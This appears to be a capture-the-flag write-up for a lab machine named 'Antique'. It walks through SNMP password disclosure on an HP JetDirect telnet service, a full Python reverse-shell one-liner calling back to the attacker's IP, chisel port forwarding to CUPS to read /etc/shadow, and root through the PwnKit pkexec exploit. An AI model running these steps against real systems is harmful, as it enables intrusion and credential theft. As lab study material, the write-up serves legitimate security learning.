@@ -1,0 +1,137 @@
+
+Antique: Vulnerabilities: Telnet server, PKexec binary exploit, exposed SNMP
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.150.247
+
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+|     JetDirect
+|     Password:
+|   NULL: 
+|_    JetDirect
+
+
+telnet 10.129.150.247
+
+I need a password
+
+└──╼ [★]$ telnet 10.129.150.247 
+Trying 10.129.150.247...
+Connected to 10.129.150.247.
+Escape character is '^]'.
+
+HP JetDirect
+
+Password: 
+Invalid password
+Connection closed by foreign host.
+
+
+Searching online about HP JetDirect and passwords we find a blogpost which explains a vulnerability that is disclosing password through SNMP string. 
+
+snmpwalk -v 2c -c public 10.129.150.247 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
+
+
+python3
+import binascii
+s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30
+31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103
+106 111 114 115 11 9 122 123 126 130 131 134 135'
+binascii.unhexlify(s.replace(' ',''))
+b'P@ssw0rd@123!!123\x13\x91q\x81\x92"2Rbs\x03\x133CSs\x83\x94$4\x95\x05\x15Eu\x86\x16WGW\x98(8i\t\x19IY\x81\x03\x10a\x11\x11A\x15\x11\x91"\x121&\x13\x011\x13A5'
+>>> 
+
+P@ssw0rd@123!!123 is the password for telnet we found
+
+
+We are able to get into telnet server
+
+> exec cat user.txt
+C7fd061bcbfea7f2f396d12f8d3903d8
+
+Let’s get a reverse shell onto our attack:
+exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.206",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+​​
+
+Privilege Escalation:
+
+There's a service running locally on port 631. This port is used by Internet Printing Protocol by default. Let's install chisel to do port forwarding 
+
+lp@antique:~$ netstat -ant
+netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
+tcp        2      0 10.129.150.247:23       10.10.14.206:40534      ESTABLISHED
+tcp        0     14 10.129.150.247:35308    10.10.14.206:1234       ESTABLISHED
+tcp       18      0 10.129.150.247:23       10.10.14.206:59442      CLOSE_WAIT 
+tcp6       0      0 ::1:631                 :::*                    LISTEN
+
+
+On attack machine:
+git clone https://github.com/jpillora/chisel 
+cd chisel && go build -ldflags="-s -w"
+sudo ./chisel server -p 8000 --reverse
+
+
+On victim network
+https://github.com/jpillora/chisel/releases/tag/v1.9.1 
+./chisel_1.9.1_linux_amd64 client 10.10.14.206:8000 R:631:127.0.0.1:631
+
+On attack network
+Go to: 127.0.0.1:631
+
+Browsing to 127.0.0.1:631 on our machine shows CUPS administration page.
+
+OpenPrinting CUPS 2.4.2
+
+Adjust configuration to make errorlog read to = /etc/shadow
+
+Then on attack machine:
+ Curl http://localhost:631/admin/log/error_log?
+
+lp@antique:~$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/authbind/helper
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/su
+
+I went in through meterpreter’s -use post/multi/recon/local_exploit_suggester 
+
+---------------  ------------
+ 1   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.
+ 2   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.13.0
+ 3   exploit/linux/local/cve_2022_1043_io_uring_priv_esc                Yes                      The target is vulnerable. > 1 CPU required, detected: 2
+ 4   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 5   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+ 6   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.8.31.pre.1ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+
+
+I’m going to use the 1st one: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec   
+
+We got root access now:
+
+(Meterpreter 2)(/root) > cat root.txt
+50c89ebb2cfb082602ee897407a7b380
+
